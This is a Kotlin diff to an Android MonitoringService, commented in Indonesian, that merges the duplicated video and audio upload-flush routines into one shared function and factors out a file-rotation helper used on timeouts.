@@ -11313,13 +11313,37 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun flushPendingVideos(max: Int = 3) {
+    // Putar berkas ke belakang antrean sesudah timeout flush
+    // (issue #824); kegagalan rotasi harus terlihat (issue
+    // #856). Dipakai bersama ketiga jalur flush (issue #985).
+    private fun rotateFlushFile(file: File) {
+        val diputar = try { file.setLastModified(System.currentTimeMillis()) } catch (_: Exception) { false }
+        if (!diputar) {
+            android.util.Log.w("MonitoringService", "Rotasi flush gagal (mtime ditolak): ${file.name}")
+        }
+    }
+
+    // Kerangka flush media bersama (issue #985): dulu
+    // flushPendingVideos dan flushPendingAudio menyalin
+    // kerangka yang sama baris demi baris. flushPendingPhotos
+    // tetap terpisah — logika foto tertahan per berkasnya
+    // memang berbeda, bukan salinan.
+    private suspend fun flushMediaSkeleton(
+        busy: java.util.concurrent.atomic.AtomicBoolean,
+        max: Int,
+        prefix: String,
+        ext: String,
+        maxBytes: Long,
+        send: suspend (File) -> MediaSendOutcome,
+        droppedSummary: (Int) -> String,
+        prune: (List<File>?) -> Unit
+    ) {
         if (NetworkUtils.isAuthBlocked(preferencesManager)) return
         if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return
         if (dataSaverDeferMedia()) return
-        if (!videoFlushBusy.compareAndSet(false, true)) return
-        var droppedVideos = 0
-        var videoProgress = false
+        if (!busy.compareAndSet(false, true)) return
+        var dropped = 0
+        var progress = false
         var lastFullListing: List<File>? = null
         try {
             if (!hasNetwork()) return
@@ -11329,7 +11353,7 @@ class MonitoringService : Service() {
             drain@ while (batches < 3) {
                 val pending = try {
                     val all = cacheDir.listFiles { file ->
-                        file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
+                        file.isFile && file.name.startsWith(prefix) && file.name.endsWith(ext)
                     }?.sortedBy { it.lastModified() } ?: break@drain
                     lastFullListing = all
                     all.filter { it.absolutePath !in attempted }.take(max)
@@ -11345,62 +11369,65 @@ class MonitoringService : Service() {
                     if (!file.exists() || file.length() == 0L) {
                         deleteQuietly(file)
                         batchProgress = true
-                        videoProgress = true
+                        progress = true
                         continue
                     }
-                    // Terlalu besar untuk Telegram (issue #848):
-                    // jalur kirim langsung menolaknya, tetapi jalur
-                    // flush sebelumnya mengunggah ulang selamanya —
-                    // buang sekali dan hitung sebagai dropped (pesan
-                    // ringkasannya memang sudah menyebut terlalu besar).
-                    if (file.length() > MAX_VIDEO_BYTES) {
+                    // Terlalu besar untuk Telegram (issue #848,
+                    // hanya video yang punya batas): jalur kirim
+                    // langsung menolaknya, tetapi jalur flush
+                    // sebelumnya mengunggah ulang selamanya —
+                    // buang sekali dan hitung sebagai dropped.
+                    if (maxBytes > 0 && file.length() > maxBytes) {
                         deleteQuietly(file)
-                        droppedVideos++
+                        dropped++
                         batchProgress = true
-                        videoProgress = true
+                        progress = true
                         continue
                     }
                     val remainMs = flushDeadline - android.os.SystemClock.elapsedRealtime()
                     if (remainMs < MEDIA_FLUSH_MIN_START_MS) break@drain
                     attempted.add(file.absolutePath)
-                    val videoResult = kotlinx.coroutines.withTimeoutOrNull(remainMs) { sendVideoFile(file) }
-                    if (videoResult == null) {
-                        // Timeout memakan sisa anggaran flush (issue
-                        // #824): putar berkas ke belakang urutan siklus
-                        // berikut agar berkas lain tidak kelaparan;
-                        // gilirannya tiba lagi dengan anggaran penuh.
-                        // Kegagalan rotasi harus terlihat (issue
-                        // #856): setLastModified melaporkan gagal
-                        // lewat false, bukan pengecualian.
-                        val diputar = try { file.setLastModified(System.currentTimeMillis()) } catch (_: Exception) { false }
-                        if (!diputar) {
-                            android.util.Log.w("MonitoringService", "Rotasi flush gagal (mtime ditolak): ${file.name}")
-                        }
+                    val result = kotlinx.coroutines.withTimeoutOrNull(remainMs) { send(file) }
+                    if (result == null) {
+                        rotateFlushFile(file)
                         continue
                     }
-                    val videoOutcome = videoResult
-                    if (videoOutcome == MediaSendOutcome.KEPT) continue
+                    if (result == MediaSendOutcome.KEPT) continue
                     monitorBeatAt = android.os.SystemClock.elapsedRealtime()
                     batchProgress = true
-                    videoProgress = true
-                    if (videoOutcome == MediaSendOutcome.DROPPED) droppedVideos++
+                    progress = true
+                    if (result == MediaSendOutcome.DROPPED) dropped++
                     kotlinx.coroutines.delay(500)
                 }
                 if (!batchProgress) break@drain
                 batches++
             }
-            if (droppedVideos > 0) {
+            if (dropped > 0) {
                 try {
-                    messageQueue.addMessage("⚠️ $droppedVideos berkas video tak bisa dikirim (kosong/tak didukung/terlalu besar) — dibuang.", true)
+                    messageQueue.addMessage(droppedSummary(dropped), true)
                     MessageScheduler.scheduleMessageSend(this)
                 } catch (_: Exception) {
                 }
             }
         } finally {
-            videoFlushBusy.set(false)
-            if (videoProgress || droppedVideos > 0) pruneVideoCache(MAX_VIDEO_KEPT, lastFullListing)
+            busy.set(false)
+            if (progress || dropped > 0) prune(lastFullListing)
         }
     }
+
+    private suspend fun flushPendingVideos(max: Int = 3) {
+        flushMediaSkeleton(
+            busy = videoFlushBusy,
+            max = max,
+            prefix = "video_",
+            ext = ".mp4",
+            maxBytes = MAX_VIDEO_BYTES,
+            send = { sendVideoFile(it) },
+            droppedSummary = { n -> "⚠️ $n berkas video tak bisa dikirim (kosong/tak didukung/terlalu besar) — dibuang." },
+            prune = { pruneVideoCache(MAX_VIDEO_KEPT, it) }
+        )
+    }
+
 
     private fun pruneVideoCache(maxKept: Int, known: List<File>? = null) {
         if (videoFlushBusy.get()) return
@@ -11427,80 +11454,18 @@ class MonitoringService : Service() {
     }
 
     private suspend fun flushPendingAudio(max: Int = 5) {
-        if (NetworkUtils.isAuthBlocked(preferencesManager)) return
-        if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return
-        if (dataSaverDeferMedia()) return
-        if (!audioFlushBusy.compareAndSet(false, true)) return
-        var droppedAudio = 0
-        var audioProgress = false
-        var lastFullListing: List<File>? = null
-        try {
-            if (!hasNetwork()) return
-            val flushDeadline = android.os.SystemClock.elapsedRealtime() + MEDIA_FLUSH_DEADLINE_MS
-            var batches = 0
-            val attempted = HashSet<String>()
-            drain@ while (batches < 3) {
-                val pending = try {
-                    val all = cacheDir.listFiles { file ->
-                        file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
-                    }?.sortedBy { it.lastModified() } ?: break@drain
-                    lastFullListing = all
-                    all.filter { it.absolutePath !in attempted }.take(max)
-                } catch (e: Exception) {
-                    break@drain
-                }
-                if (pending.isEmpty()) break@drain
-                val now = System.currentTimeMillis()
-                var batchProgress = false
-                for (file in pending) {
-                    if (isMediaActive(file)) continue
-                    if (now - file.lastModified() < 10_000L) continue
-                    if (!file.exists() || file.length() == 0L) {
-                        deleteQuietly(file)
-                        batchProgress = true
-                        audioProgress = true
-                        continue
-                    }
-                    val remainMs = flushDeadline - android.os.SystemClock.elapsedRealtime()
-                    if (remainMs < MEDIA_FLUSH_MIN_START_MS) break@drain
-                    attempted.add(file.absolutePath)
-                    val audioResult = kotlinx.coroutines.withTimeoutOrNull(remainMs) { sendAudioFile(file) }
-                    if (audioResult == null) {
-                        // Timeout flush (issue #824): putar ke belakang
-                        // urutan siklus berikut, jangan kelaparkan
-                        // berkas lain.
-                        // Kegagalan rotasi harus terlihat (issue
-                        // #856): setLastModified melaporkan gagal
-                        // lewat false, bukan pengecualian.
-                        val diputar = try { file.setLastModified(System.currentTimeMillis()) } catch (_: Exception) { false }
-                        if (!diputar) {
-                            android.util.Log.w("MonitoringService", "Rotasi flush gagal (mtime ditolak): ${file.name}")
-                        }
-                        continue
-                    }
-                    val audioOutcome = audioResult
-                    if (audioOutcome == MediaSendOutcome.KEPT) continue
-                    monitorBeatAt = android.os.SystemClock.elapsedRealtime()
-                    batchProgress = true
-                    audioProgress = true
-                    if (audioOutcome == MediaSendOutcome.DROPPED) droppedAudio++
-                    kotlinx.coroutines.delay(500)
-                }
-                if (!batchProgress) break@drain
-                batches++
-            }
-            if (droppedAudio > 0) {
-                try {
-                    messageQueue.addMessage("\u26A0\uFE0F $droppedAudio berkas rekaman tak bisa dikirim (kosong/tak didukung/terlalu besar) — dibuang.", true)
-                    MessageScheduler.scheduleMessageSend(this)
-                } catch (_: Exception) {
-                }
-            }
-        } finally {
-            audioFlushBusy.set(false)
-            if (audioProgress || droppedAudio > 0) pruneAudioCache(MAX_AUDIO_KEPT, lastFullListing)
-        }
+        flushMediaSkeleton(
+            busy = audioFlushBusy,
+            max = max,
+            prefix = "audio_",
+            ext = ".m4a",
+            maxBytes = 0L,
+            send = { sendAudioFile(it) },
+            droppedSummary = { n -> "\u26A0\uFE0F $n berkas rekaman tak bisa dikirim (kosong/tak didukung/terlalu besar) — dibuang." },
+            prune = { pruneAudioCache(MAX_AUDIO_KEPT, it) }
+        )
     }
+
 
     private fun pruneAudioCache(maxKept: Int, known: List<File>? = null) {
         if (audioFlushBusy.get()) return
@@ -11765,10 +11730,7 @@ class MonitoringService : Service() {
                         // Kegagalan rotasi harus terlihat (issue
                         // #856): setLastModified melaporkan gagal
                         // lewat false, bukan pengecualian.
-                        val diputar = try { file.setLastModified(System.currentTimeMillis()) } catch (_: Exception) { false }
-                        if (!diputar) {
-                            android.util.Log.w("MonitoringService", "Rotasi flush gagal (mtime ditolak): ${file.name}")
-                        }
+                        rotateFlushFile(file)
                         continue
                     }
                     val photoOutcome = photoResult
